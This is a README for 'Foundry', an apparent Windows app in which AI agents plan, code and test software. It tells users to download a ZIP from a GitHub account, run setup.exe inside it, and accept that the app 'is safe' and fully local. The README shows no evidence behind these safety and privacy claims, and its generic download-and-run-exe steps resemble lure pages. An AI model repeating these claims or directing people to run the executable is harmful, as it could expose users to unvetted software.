# 🏗️ Foundry - Build your own AI company today

[![](https://img.shields.io/badge/Download_Foundry-blue.svg)](https://github.com/Asceticrefractoryperiod28/Foundry)

Foundry creates software companies using smart agents. You provide the goal, and the program builds the business. It automates tasks, manages workflows, and writes code. You do not need to know how to program to use this tool.

## ⚙️ Requirements

Foundry runs on Windows. Your computer needs these items to work:

* Windows 10 or 11.
* A stable internet connection.
* At least 8 gigabytes of RAM.
* A processor made in the last five years.

Ensure your computer has enough storage space for the files. If you run many agents at once, the program uses more memory. Close other heavy programs while you run Foundry.

## 📥 How to download

You obtain the software through the official project page. Follow these steps to get the files:

1. Visit [https://github.com/Asceticrefractoryperiod28/Foundry](https://github.com/Asceticrefractoryperiod28/Foundry).
2. Look for the green button labeled Code.
3. Click the button and choose Download ZIP.
4. Save the file to your desktop.

This link holds the current version of the tool. Always check this page for updates or new features.

## 🚀 Setting up the software

Follow these steps to prepare the tool after the download finishes:

1. Right-click the ZIP file on your desktop.
2. Select Extract All and click Extract.
3. Open the folder that appears.
4. Find the file named setup.exe inside the folder.
5. Double-click setup.exe to start the installer.
6. Follow the prompts on the screen.
7. Click Finish when the bar fills completely.

The program creates a shortcut on your desktop. Click this icon to open the application.

## 🛠️ Using the interface

The main window shows your dashboard. You see your active projects here. Click the button labeled New Company to begin. 

A panel opens where you define your business idea. Tell the AI what you want to build. For example, write "create a tool to track my grocery budget." The agents within Foundry start to work. They draft a plan, write necessary files, and test the features.

You watch the agents talk to each other in the logs window. This shows you exactly what the agents do. If you see an error, click the Fix button. The system scans the files and corrects the issue automatically.

## 🧠 Core features

Foundry mimics a real office environment. It organizes tasks into departments:

* The Planner agent creates a list of jobs.
* The Developer agent writes the specific lines of code.
* The Tester agent checks the code for bugs.
* The Manager agent oversees the timeline.

You control the speed of these agents. Increase the speed to get results fast. Decrease the speed to follow the work step by step.

## 🔌 Managing your workflow

Save your work often. Foundry stores your companies in the My Projects folder. You can export any project as a standalone folder. This folder contains the code for your new app. You can run that code separately if you want to share it with others.

If you add a new goal, the agents create a branch. This lets you experiment without breaking your main project. You can delete or merge branches at any time.

## 🛡️ Safety and security

Foundry runs locally on your machine. The AI agents process your data on your own hard drive. Your business ideas stay private. No outside server sees your work unless you choose to publish it.

Keep your antivirus software active. While Foundry is safe, always scan downloaded files before you run them.

## 🔍 Troubleshooting

Common issues have easy fixes:

* The app does not open: Ensure you installed all required Windows updates.
* The AI stops responding: Click the Refresh button on the dashboard.
* The application runs slow: Close your web browser or other apps that use heavy graphics.
* Files do not save: Check that you have administrator rights on your computer.

If you encounter a persistent error, restart your computer. This clears the memory and stops hung processes.

## 📋 Best practices

Start with simple ideas. Ask the AI to build a simple calculator or a list-maker. This helps you understand how the agents communicate. 

Rename your projects to keep them organized. Use clear names like "Inventory App" or "Contact List." Foundry lists these alphabetically. 

Check for updates once a week. The developers release new versions with better agent performance. Simply repeat the download steps if you need a newer version. Replace the old folder with the new one to update your system.
